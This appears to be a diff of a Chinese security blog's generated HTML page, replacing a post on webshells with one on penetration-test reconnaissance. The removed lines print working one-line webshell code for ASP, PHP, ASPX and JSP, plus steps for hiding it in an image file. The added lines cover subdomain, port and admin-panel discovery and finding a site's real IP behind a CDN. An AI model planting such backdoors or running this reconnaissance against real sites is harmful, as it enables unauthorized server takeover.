@@ -108,18 +108,18 @@
 
 
 
-  <meta name="description" content="什么是脚本木马？脚本木马能干什么？脚本木马怎么做？">
-<meta name="keywords" content="webshell">
+  <meta name="description" content="信息收集基本信息收集 域名信息；敏感目录；端口扫描；旁站C段 整站分析；google hacker；url采集；信息分析；  域名信息对应ip收集：nslookup、站长工具 子域名收集：layer、subDomainBrute；主站没有漏洞，子站或许比较薄弱； whois信息查询：查询注册人的一些相关信息 敏感目录 收集方向 robots.txt、后台目录、==安装包==、上传目录、mysql管">
+<meta name="keywords" content="信息收集">
 <meta property="og:type" content="article">
-<meta property="og:title" content="脚本木马制作及原理">
-<meta property="og:url" content="https://bookchi.github.io/2019/03/30/脚本木马制作及原理/index.html">
+<meta property="og:title" content="基本信息收集">
+<meta property="og:url" content="https://bookchi.github.io/2019/03/31/基本信息收集/index.html">
 <meta property="og:site_name" content="fuubar2">
-<meta property="og:description" content="什么是脚本木马？脚本木马能干什么？脚本木马怎么做？">
+<meta property="og:description" content="信息收集基本信息收集 域名信息；敏感目录；端口扫描；旁站C段 整站分析；google hacker；url采集；信息分析；  域名信息对应ip收集：nslookup、站长工具 子域名收集：layer、subDomainBrute；主站没有漏洞，子站或许比较薄弱； whois信息查询：查询注册人的一些相关信息 敏感目录 收集方向 robots.txt、后台目录、==安装包==、上传目录、mysql管">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-03-30T12:36:12.282Z">
+<meta property="og:updated_time" content="2019-03-31T14:51:23.648Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="脚本木马制作及原理">
-<meta name="twitter:description" content="什么是脚本木马？脚本木马能干什么？脚本木马怎么做？">
+<meta name="twitter:title" content="基本信息收集">
+<meta name="twitter:description" content="信息收集基本信息收集 域名信息；敏感目录；端口扫描；旁站C段 整站分析；google hacker；url采集；信息分析；  域名信息对应ip收集：nslookup、站长工具 子域名收集：layer、subDomainBrute；主站没有漏洞，子站或许比较薄弱； whois信息查询：查询注册人的一些相关信息 敏感目录 收集方向 robots.txt、后台目录、==安装包==、上传目录、mysql管">
 
 
 
@@ -128,7 +128,7 @@
 
 
 
-  <link rel="canonical" href="https://bookchi.github.io/2019/03/30/脚本木马制作及原理/"/>
+  <link rel="canonical" href="https://bookchi.github.io/2019/03/31/基本信息收集/"/>
 
 
 
@@ -138,7 +138,7 @@
   };
 </script>
 
-  <title>脚本木马制作及原理 | fuubar2</title>
+  <title>基本信息收集 | fuubar2</title>
   
 
 
@@ -300,7 +300,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://bookchi.github.io/2019/03/30/脚本木马制作及原理/">
+    <link itemprop="mainEntityOfPage" href="https://bookchi.github.io/2019/03/31/基本信息收集/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="fuubar">
@@ -317,7 +317,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">脚本木马制作及原理
+          <h1 class="post-title" itemprop="name headline">基本信息收集
               
             
           </h1>
@@ -342,7 +342,7 @@
                 
               
 
-              <time title="Created: 2019-03-30 20:29:17 / Modified: 20:36:12" itemprop="dateCreated datePublished" datetime="2019-03-30T20:29:17+08:00">2019-03-30</time>
+              <time title="Created: 2019-03-31 22:50:28 / Modified: 22:51:23" itemprop="dateCreated datePublished" datetime="2019-03-31T22:50:28+08:00">2019-03-31</time>
             
 
             
@@ -371,7 +371,7 @@
                   , 
                 
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全/Webshell/" itemprop="url" rel="index"><span itemprop="name">Webshell</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全/信息收集/" itemprop="url" rel="index"><span itemprop="name">信息收集</span></a></span>
 
                 
                 
@@ -405,64 +405,73 @@
       
 
       
-        <p>什么是脚本木马？脚本木马能干什么？脚本木马怎么做？</p>
-<a id="more"></a>
-<h3 id="脚本木马的制作及原理"><a href="#脚本木马的制作及原理" class="headerlink" title="脚本木马的制作及原理"></a>脚本木马的制作及原理</h3><blockquote>
-<p>什么是脚本木马？</p>
-<p>脚本木马能干什么？</p>
-<p>脚本木马怎么做？</p>
+        <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h4><blockquote>
+<p>域名信息；敏感目录；端口扫描；旁站C段</p>
+<p>整站分析；google hacker；url采集；信息分析；</p>
 </blockquote>
-<h4 id="webshell制作原理"><a href="#webshell制作原理" class="headerlink" title="webshell制作原理"></a>webshell制作原理</h4><h5 id="webshell的种类"><a href="#webshell的种类" class="headerlink" title="webshell的种类"></a>webshell的种类</h5><p>webshell就是wen后门，方便我们对网站进行任意修改；</p>
-<p>分类：一句话木马；小马；大马；打包马；脱库马；etc</p>
-<h5 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h5><ul>
-<li><p>一句话木马</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 短小精悍，功能强大，*隐蔽性*很好；在入侵中时钟扮演着强大的作用</span><br><span class="line"></span><br><span class="line"># 执行客户端传过来的数据value；关键在于传输的value</span><br><span class="line">&lt;% execute request(&quot;value&quot;) %&gt;	# 支持get，post等方法 cookie也可以</span><br><span class="line">&lt;% eval request(&quot;value&quot;) %&gt;</span><br><span class="line"># eval也可以改成system()/exec()</span><br><span class="line"></span><br><span class="line"># 常见写法:</span><br><span class="line"># asp</span><br><span class="line">&lt;% eval request(&quot;value&quot;) %&gt;	</span><br><span class="line"></span><br><span class="line"># php</span><br><span class="line">&lt;?php @eval($_POST[&apos;value&apos;]); ?&gt;	</span><br><span class="line"></span><br><span class="line"># aspx</span><br><span class="line">&lt;%@ Page Lanuage=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;value&quot;])%&gt;</span><br><span class="line"></span><br><span class="line"># jsp</span><br><span class="line">&lt;%</span><br><span class="line">if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"># 一句话变形</span><br><span class="line">。。。。。。</span><br></pre></td></tr></table></figure>
-<ul>
-<li><p>使用方法</p>
-<p>假设已经上传了webshell；</p>
-<p>菜刀是连接webshell的客户端；也有html格式的客户端；<em>编码问题</em></p>
-<p>使用菜刀去连接shell.php：文件管理；数据库管理；虚拟终端(可用来执行命令)；</p>
+<h5 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h5><p>对应ip收集：nslookup、站长工具</p>
+<p>子域名收集：layer、subDomainBrute；主站没有漏洞，子站或许比较薄弱；</p>
+<p>whois信息查询：查询注册人的一些相关信息</p>
+<h5 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h5><ul>
+<li><p>收集方向</p>
+<p>robots.txt、后台目录、==安装包==、上传目录、mysql管理接口(比如phpMyAdmin)、安装页面、phpinfo、编辑器、iis短文件</p>
+</li>
+<li><p>常用工具</p>
+<p>字典爆破：御剑、dirbuster、wwwscan、IIS_shortname_Scanner</p>
+<p>蜘蛛爬行：爬行菜刀、webrobot、bp</p>
 </li>
 </ul>
+<h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">21——&gt;FTP	2121</span><br><span class="line">22——&gt;SSH</span><br><span class="line">23——&gt;Telnet</span><br><span class="line">110——&gt;POP3</span><br><span class="line">1433——&gt;sqlserer</span><br><span class="line">...</span><br><span class="line">3389——&gt;远程服务</span><br><span class="line">8080——&gt;Tomcat/jboss</span><br><span class="line">3389——&gt;WebSphere</span><br></pre></td></tr></table></figure>
+<p>常用工具：nmap、scanport、ntscan(内网渗透用的较多)</p>
+<h5 id="旁站C段"><a href="#旁站C段" class="headerlink" title="旁站C段"></a>旁站C段</h5><p>旁站：同一个服务器的其他站点</p>
+<p>C段：同一网段其他服务器；可能它们连在一个网关上，然后可以进行内网渗透(mac需动态获取)；</p>
+<p>常用工具：web&gt;&gt;御剑1.5</p>
+<p>​            端口&gt;&gt;portscan</p>
+<h5 id="整站分析"><a href="#整站分析" class="headerlink" title="整站分析"></a>整站分析</h5><ul>
+<li><p>服务器类型</p>
+<p>服务器平台(主要在提权时用到)、版本</p>
+<p>nmap -O可以识别服务器版本；</p>
 </li>
-<li><p>一句话图片马</p>
-<ul>
-<li>找一个正常的图片，然后把木马加进去；</li>
+<li><p>网站容器</p>
+<p>常见的有：iis、Apache、Nginx、tomcat、lighthttpd等；</p>
+</li>
+<li><p>脚本类型</p>
+<p>asp、jsp、php、aspx</p>
+</li>
+<li><p>数据库类型</p>
+<p>access、sqlserver、mysql、oracle、postgresql</p>
+</li>
+<li><p>CMS类型(很重要)</p>
+</li>
+<li><p>WAF</p>
+<p>常见的：安全狗、蓝盾之类的</p>
+</li>
 </ul>
+<h5 id="google-hacker"><a href="#google-hacker" class="headerlink" title="google hacker"></a>google hacker</h5><p>intext, intitle, filetype, inurl, site etc;</p>
+<h5 id="url采集"><a href="#url采集" class="headerlink" title="url采集"></a>url采集</h5><p>url采集工具，使用google hacker语法，然后可以把采集到的url导入到御剑，批量检测注入；椰树也可以；</p>
+<h4 id="网站后台查找"><a href="#网站后台查找" class="headerlink" title="网站后台查找"></a>网站后台查找</h4><p>查找网站的后台；</p>
 <blockquote>
 <ol>
-<li>windows下，右击图片，在版权里加入一句话</li>
-<li>使用cmd合并图片和一句话脚本：cmd /b 1.jpg+shell.php shell1.jpg</li>
-<li>使用c32,16进制显示图片，把一句话以hex形式复制进去</li>
+<li>弱口令默认后台：admin，admin/login.asp， manage，login.asp，webmaster</li>
+<li>查看网页链接</li>
+<li>查看网站图片属性           # 不太好用</li>
+<li>查看看网站用的管理系统，从而确定后台</li>
+<li>使用工具查找：御剑，bp什么收集目录</li>
+<li>robots.txt的帮助：有时候后台会写在robots文件中</li>
+<li>google hacker</li>
+<li>查看网站使用的编辑器是会否有默认后台</li>
+<li>短文件利用</li>
+<li>sqlmap –sql-shell load_file(‘d:/wwwroot/index.php’)</li>
 </ol>
 </blockquote>
-<ul>
-<li><p>把图片改成脚本格式</p>
-</li>
-<li><p>常见一句话客户端：</p>
-<p>中国菜刀、中国砍刀、xise菜刀、lanker、Weevely、zv新型php一句话木马客户端</p>
-</li>
-</ul>
-</li>
-</ul>
-<h5 id="小马"><a href="#小马" class="headerlink" title="小马"></a>小马</h5><p>diy.asp，可以做免杀；用来上传大马；</p>
-<p>小马不能用菜刀去连接，直接去访问；</p>
-<h5 id="大马"><a href="#大马" class="headerlink" title="大马"></a>大马</h5><p>大马体积较大，一般50K以上。功能较多，一般包括提权命令、磁盘管理、数据库连接接口、执行命令；</p>
-<p>但隐蔽性不好，不加密的话会被杀掉；</p>
-<h4 id="webshell使用技巧"><a href="#webshell使用技巧" class="headerlink" title="webshell使用技巧"></a>webshell使用技巧</h4><h5 id="一句话的使用"><a href="#一句话的使用" class="headerlink" title="一句话的使用"></a>一句话的使用</h5><p>就是要把一句话代码以脚本格式运行，或者写入数据库；</p>
-<h5 id="小马-1"><a href="#小马-1" class="headerlink" title="小马"></a>小马</h5><p>主要用来上传大马</p>
-<h5 id="大马-1"><a href="#大马-1" class="headerlink" title="大马"></a>大马</h5><p>主要用途：提权、打包、脱裤、增删文件etc</p>
-<h5 id="使用技巧"><a href="#使用技巧" class="headerlink" title="使用技巧"></a>使用技巧</h5><p>内容编码：如果有防护，可以用编码去绕；</p>
-<p>配合解析漏洞：可能上传图片，然后要改文件的格式，改格式要利用解析漏洞；</p>
-<p>配合文件包含</p>
-<p>利用文件名溢出</p>
-<h4 id="webshell黑吃黑"><a href="#webshell黑吃黑" class="headerlink" title="webshell黑吃黑"></a>webshell黑吃黑</h4><p>后门：有的是自动去连接；有的是触发后门(比如点击了查看报告按钮)；</p>
-<p>大概就是，如果我用菜刀去连接shell，菜刀本身有后门，会把我上传的shell信息发送给留后门者的服务器；</p>
-<p>但我可以把某些地方，比如密码的地方，输入xss代码，转而去窃取留后门者的cookie；</p>
-<p>怎么找菜刀的后门？</p>
-<p>菜刀的后门：http(WSExplorer)、tcp(wireshark)</p>
-<p>怎么删后门？对http：修改host文件，比如要传给<a href="http://www.fuubar.com，那就把它对应的IP改掉；" target="_blank" rel="noopener">www.fuubar.com，那就把它对应的IP改掉；</a></p>
-<p>tcp的比较困难，还需要反汇编；</p>
+<h4 id="CDN绕过方法"><a href="#CDN绕过方法" class="headerlink" title="CDN绕过方法"></a>CDN绕过方法</h4><h5 id="什么是CDN？"><a href="#什么是CDN？" class="headerlink" title="什么是CDN？"></a>什么是CDN？</h5><p>是内容分发网络，类似火车票的代售点，是主服务器的替身服务器，替主服务器分担压力；</p>
+<p>攻击的话，可能会攻击到CND服务区七，而非真身；</p>
+<h5 id="如何判断有没有CDN"><a href="#如何判断有没有CDN" class="headerlink" title="如何判断有没有CDN"></a>如何判断有没有CDN</h5><p>可以使用站长工具进行超级ping；如果各个地方解析的都是一个IP，那么显然是没有CDN；</p>
+<h5 id="查询真实ip"><a href="#查询真实ip" class="headerlink" title="查询真实ip"></a>查询真实ip</h5><p>查找二级域名：主站一般会有CDN，但是子站不一定；所以去查找子域名(可能在一个服务器上)，通过它来进行攻击；</p>
+<p>让服务器主动给你发包：一般是通过主服务器和你交互；可以通过邮件发包，注册；</p>
+<p>敏感文件泄露：比如phpinfo，会泄露真实服务器的ip；</p>
+<p>查询历史解析ip：比如用ip138，查询某个域名的ip，会查到很多ip，比较早的可能就是真实ip；</p>
+<h5 id="穿过CDN"><a href="#穿过CDN" class="headerlink" title="穿过CDN"></a>穿过CDN</h5><p>修改host文件，把域名对应的ip修改掉即可；(host文件也可以被欺骗)</p>
 
       
     </div>
@@ -482,12 +491,12 @@
   <!-- JS库 sweetalert 可修改路径 -->
   <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  <p><span>本文标题:</span><a href="/2019/03/30/脚本木马制作及原理/">脚本木马制作及原理</a></p>
+  <p><span>本文标题:</span><a href="/2019/03/31/基本信息收集/">基本信息收集</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 fuubar 的个人博客">fuubar</a></p>
-  <p><span>发布时间:</span>2019年03月30日 - 20:03</p>
-  <p><span>最后更新:</span>2019年03月30日 - 20:03</p>
-  <p><span>原始链接:</span><a href="/2019/03/30/脚本木马制作及原理/" title="脚本木马制作及原理">https://bookchi.github.io/2019/03/30/脚本木马制作及原理/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://bookchi.github.io/2019/03/30/脚本木马制作及原理/"  aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2019年03月31日 - 22:03</p>
+  <p><span>最后更新:</span>2019年03月31日 - 22:03</p>
+  <p><span>原始链接:</span><a href="/2019/03/31/基本信息收集/" title="基本信息收集">https://bookchi.github.io/2019/03/31/基本信息收集/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://bookchi.github.io/2019/03/31/基本信息收集/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -518,7 +527,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/webshell/" rel="tag"># webshell</a>
+            <a href="/tags/信息收集/" rel="tag"># 信息收集</a>
           
         </div>
       
@@ -531,8 +540,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/03/29/sqlmap使用/" rel="next" title="sqlmap使用">
-                <i class="fa fa-chevron-left"></i> sqlmap使用
+              <a href="/2019/03/30/脚本木马制作及原理/" rel="next" title="脚本木马制作及原理">
+                <i class="fa fa-chevron-left"></i> 脚本木马制作及原理
               </a>
             
           </div>
@@ -540,10 +549,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/03/31/基本信息收集/" rel="prev" title="基本信息收集">
-                基本信息收集 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -706,7 +711,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#脚本木马的制作及原理"><span class="nav-number">1.</span> <span class="nav-text">脚本木马的制作及原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#webshell制作原理"><span class="nav-number">1.1.</span> <span class="nav-text">webshell制作原理</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#webshell的种类"><span class="nav-number">1.1.1.</span> <span class="nav-text">webshell的种类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#一句话木马"><span class="nav-number">1.1.2.</span> <span class="nav-text">一句话木马</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#小马"><span class="nav-number">1.1.3.</span> <span class="nav-text">小马</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#大马"><span class="nav-number">1.1.4.</span> <span class="nav-text">大马</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#webshell使用技巧"><span class="nav-number">1.2.</span> <span class="nav-text">webshell使用技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#一句话的使用"><span class="nav-number">1.2.1.</span> <span class="nav-text">一句话的使用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#小马-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">小马</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#大马-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">大马</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用技巧"><span class="nav-number">1.2.4.</span> <span class="nav-text">使用技巧</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#webshell黑吃黑"><span class="nav-number">1.3.</span> <span class="nav-text">webshell黑吃黑</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基本信息收集"><span class="nav-number">1.1.</span> <span class="nav-text">基本信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#域名信息"><span class="nav-number">1.1.1.</span> <span class="nav-text">域名信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#敏感目录"><span class="nav-number">1.1.2.</span> <span class="nav-text">敏感目录</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#端口扫描"><span class="nav-number">1.1.3.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#旁站C段"><span class="nav-number">1.1.4.</span> <span class="nav-text">旁站C段</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#整站分析"><span class="nav-number">1.1.5.</span> <span class="nav-text">整站分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#google-hacker"><span class="nav-number">1.1.6.</span> <span class="nav-text">google hacker</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#url采集"><span class="nav-number">1.1.7.</span> <span class="nav-text">url采集</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#网站后台查找"><span class="nav-number">1.2.</span> <span class="nav-text">网站后台查找</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CDN绕过方法"><span class="nav-number">1.3.</span> <span class="nav-text">CDN绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#什么是CDN？"><span class="nav-number">1.3.1.</span> <span class="nav-text">什么是CDN？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如何判断有没有CDN"><span class="nav-number">1.3.2.</span> <span class="nav-text">如何判断有没有CDN</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#查询真实ip"><span class="nav-number">1.3.3.</span> <span class="nav-text">查询真实ip</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#穿过CDN"><span class="nav-number">1.3.4.</span> <span class="nav-text">穿过CDN</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
